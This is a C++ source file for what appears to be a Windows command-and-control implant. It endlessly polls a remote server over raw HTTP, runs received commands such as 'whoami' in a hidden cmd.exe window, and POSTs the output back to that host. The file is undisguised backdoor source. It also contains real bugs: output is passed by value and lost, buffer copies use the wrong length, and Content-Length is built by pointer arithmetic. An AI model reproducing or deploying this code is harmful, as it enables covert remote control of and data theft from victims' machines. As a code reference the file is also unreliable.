#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <algorithm>
#include <sstream>
#include "main.h"

#pragma comment(lib, "ws2_32.lib")

int main()
{
    while (true)
    {
        poll_c2();
        Sleep(SLEEP_SECONDS * 1000);
    }
}

int execute_command(
    std::string command,
    std::vector<char> command_output)
{
    std::vector<char> strResult;
    HANDLE hPipeRead, hPipeWrite;

    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};

    // Pipe handles are inherited by child process.
    saAttr.bInheritHandle = TRUE;

    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe to get results from child's stdout.
    if (!CreatePipe(
            &hPipeRead,
            &hPipeWrite,
            &saAttr,
            0))
    {
        return FAILED_PIPE_CREATION;
    }

    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    BOOL fSuccess = CreateProcessA(
        NULL,
        strdup(command.c_str()),
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
    if (!fSuccess)
    {
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        return FAILED_PROCESS_CREATION;
    }

    bool bProcessEnded = false;
    for (; !bProcessEnded;)
    {
        // Give some timeslice (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;

        // Even if process exited - we continue reading, if
        // there is some data available over pipe.
        for (;;)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
                break;

            if (!dwAvail) // No data available, return
                break;

            if (!::ReadFile(
                    hPipeRead,
                    buf,
                    std::min((int)sizeof(buf) - 1, (int)dwAvail),
                    &dwRead,
                    NULL) ||
                !dwRead)
            {
                // Error, the child process might ended
                break;
            }

            buf[dwRead] = 0;
            strResult.insert(strResult.end(), buf, buf + sizeof(buf));
        }
    }

    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return EXIT_SUCCESS;
}

int poll_c2()
{
    WSADATA wsaData;
    int lineCount = 0;
    int rowCount = 0;
    std::vector<char> http_response;
    std::vector<char> http_request;
    std::string http_request_headers;
    SOCKET client_socket = INVALID_SOCKET;

    struct sockaddr_in server_socket;
    server_socket.sin_port = htons(HTTP_PORT);
    server_socket.sin_family = AF_INET;

    IN_ADDR remote_server_ip_address;
    inet_pton(
        AF_INET,
        REMOTE_HOST_IP_ADDRESS,
        &remote_server_ip_address);
    server_socket.sin_addr = remote_server_ip_address;

    http_request_headers = "GET " HTTP_GET_PAGE " HTTP/" HTTP_PROTO_VER "\r\n";
    http_request_headers += "Host: " HTTP_HOST "\r\n";
    http_request_headers += "Cookie: " HTTP_COOKIE_NAME "=" HTTP_COOKIE_VALUE "\r\n";
    http_request_headers += "Connection: close\r\n\r\n";

    http_request.insert(http_request.end(), http_request_headers.begin(), http_request_headers.end());

#ifdef _DEBUG
    printf("\n[+] HTTP Request:\n");
    for (char i: http_request)
    {
        std::cout << i;
    }
    std::cout << std::endl;
    
#endif

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
#ifdef _DEBUG
        std::cout << "[!] WSAStartup failed.\n";
#endif
        return 1;
    }

    struct addrinfo *result = NULL;
    struct addrinfo *ptr = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));

    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == INVALID_SOCKET)
    {
#ifdef _DEBUG
        printf("[!] socket failed with error: %ld\n", WSAGetLastError());
#endif

        WSACleanup();
        return 1;
    }

    int iResult = connect(
        client_socket,
        (struct sockaddr *)&server_socket,
        sizeof(server_socket));
    if (iResult == SOCKET_ERROR)
    {
#ifdef _DEBUG
        printf("[!] Could not connect to the host\n");
#endif
        closesocket(client_socket);
        client_socket = INVALID_SOCKET;

        return false;
    }

    send(client_socket, &http_request[0], http_request.size(), 0);

    int nDataLength;
#ifdef _DEBUG
    printf("[+] Copying the bytes of the HTTP response in the buffer\n");
#endif

    std::vector<char> chunk(1024);

    while ((nDataLength = recv(client_socket, chunk.data(), chunk.size() - 1, 0)) > 0)
    {
        http_response.insert(http_response.end(), chunk.begin(), chunk.end());
    }

    if (client_socket == INVALID_SOCKET)
    {
#ifdef _DEBUG
        printf("[!] Client socket is invalid\n");
#endif
        closesocket(client_socket);
    }

    WSACleanup();

    return parse_http_response(http_response);
}

int parse_http_response(std::vector<char> http_response)
{
#ifdef _DEBUG
    printf("\n[+] HTTP Response:\n");
    for (char i: http_response)
    {
        std::cout << i;
    }
    std::cout << std::endl;
#endif

    if (strncmp(&http_response[0], "HTTP/1.1 200", 12) != 0)
    {
#ifdef _DEBUG
        printf("\n[+] Didn't receive a 200 OK. Moving on...");
#endif
        return WRONG_HTTP_CODE;
    }

    std::string double_clrf = "\r\n\r\n";
    // it will contain an iterator into the vector v where that pattern begins
    // (or v.end() if the pattern is not found).
    auto it = std::search(http_response.begin(), http_response.end(), double_clrf.begin(), double_clrf.end());
    int http_body_index = std::distance(http_response.begin(), it);
    char *http_body_pointer = &http_response[0] + http_body_index;

#ifdef _DEBUG
    printf(
        "\n[+] Address of the buffer containing the bytes of the HTTP response: %p\n",
        &http_response[0]);
    printf("[+] Address of the HTTP body: %p\n", http_body_pointer);
#endif

    if (http_body_pointer == NULL)
    {
#ifdef _DEBUG
        printf("[!] Coudln't find the sequence '\\r\\n\\r\\n' in the HTTP response\n");
#endif
        return HTTP_PROCESSING_ERROR;
    }

#ifdef _DEBUG
    printf(
        "[+] Index of the first byte of the body of the HTTP request: %d\n",
        http_body_index);
#endif

    return parse_http_response_body(http_response, http_body_index);
}

int parse_http_response_body(std::vector<char> http_response, int http_body_index)
{
    std::vector<char> http_response_body;
    http_response_body.insert(
        http_response_body.begin(),
        http_response.begin() + http_body_index,
        http_response.end()
    );

#ifdef _DEBUG
    printf("[+] Body of the HTTP response:\n");
    for (char i: http_response_body)
    {
        std::cout << i;
    }
    std::cout << std::endl;
#endif
    if (std::search(
            http_response_body.begin(),
            http_response_body.end(),
            COMMAND_PWD,
            COMMAND_PWD + sizeof(COMMAND_PWD) - 1
        ) != http_response_body.end()
    )
    {
#ifdef _DEBUG
        printf("\n[+] Executing command 'pwd'\n");
#endif
        CHAR current_path[MAX_PATH];
        if (GetCurrentDirectoryA(
                MAX_PATH,
                (LPSTR)&current_path) == 0)
        {
#ifdef _DEBUG
            printf("[!] Couldn't retrieve the current directory for the current process\n");
#endif
            return FAIL_COMMAND_EXECUTION;
        }

        std::vector<char> pwd_output;
        pwd_output.insert(pwd_output.begin(), current_path, current_path + sizeof(current_path));

        send_command_output(pwd_output);
    }
    else if (std::search(
            http_response_body.begin(),
            http_response_body.end(),
            COMMAND_WHOAMI,
            COMMAND_WHOAMI + sizeof(COMMAND_WHOAMI) - 1
        ) != http_response_body.end()
    )
    {
#ifdef _DEBUG
        printf("[+] Executing command 'whoami'\n");
#endif
        std::vector<char> command_output;
        std::string command = "C:\\Windows\\System32\\cmd.exe /c whoami";
        execute_command(command, command_output);
        send_command_output(command_output);
    }

    return EXIT_SUCCESS;
}

int send_command_output(std::vector<char> command_output)
{
    WSADATA wsaData;
    int lineCount = 0;
    int rowCount = 0;
    std::vector<char> post_http;
    SOCKET client_socket = INVALID_SOCKET;

    struct sockaddr_in server_socket;
    server_socket.sin_port = htons(HTTP_PORT);
    server_socket.sin_family = AF_INET;

    IN_ADDR remote_server_ip_address;
    inet_pton(
        AF_INET,
        REMOTE_HOST_IP_ADDRESS,
        &remote_server_ip_address);
    server_socket.sin_addr = remote_server_ip_address;

    std::string http_request_headers = "POST " HTTP_POST_PAGE " HTTP/" HTTP_PROTO_VER "\r\n";
    http_request_headers += "Host: " HTTP_HOST "\r\n";
    http_request_headers += "Cookie: " HTTP_COOKIE_NAME "=" HTTP_COOKIE_VALUE "\r\n";
    http_request_headers += "Content-Length: " + command_output.size();
    http_request_headers += "\r\n";
    http_request_headers += "Connection: close\r\n";
    http_request_headers += "\r\n";

    std::vector<char> http_request;
    http_request.insert(http_request.begin(), http_request_headers.begin(), http_request_headers.end());
    http_request.insert(http_request.end(), command_output.begin(), command_output.end());

#ifdef _DEBUG
    printf("[+] HTTP Response:\n");
    for (char i: http_request)
    {
        std::cout << i;
    }
    std::cout << std::endl;
#endif

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
#ifdef _DEBUG
        std::cout << "[!] WSAStartup failed.\n";
#endif
        return false;
    }

    struct addrinfo *result = NULL;
    struct addrinfo *ptr = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));

    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == INVALID_SOCKET)
    {
#ifdef _DEBUG
        printf("[!] socket failed with error: %ld\n", WSAGetLastError());
#endif

        WSACleanup();
        return 1;
    }

    int iResult = connect(
        client_socket,
        (struct sockaddr *)&server_socket,
        sizeof(server_socket));
    if (iResult == SOCKET_ERROR)
    {
#ifdef _DEBUG
        std::cout << "[!] Could not connect to the host\n";
#endif
        closesocket(client_socket);
        client_socket = INVALID_SOCKET;
        return false;
    }

    send(client_socket, &http_request[0], http_request.size(), 0);

    int nDataLength;

    std::vector<char> chunk(1024);
    while ((nDataLength = recv(client_socket, chunk.data(), chunk.size() - 1, 0)) > 0)
    {
        continue;
    }

    if (client_socket == INVALID_SOCKET)
    {
        closesocket(client_socket);
    }

    WSACleanup();

    return EXIT_SUCCESS;
}
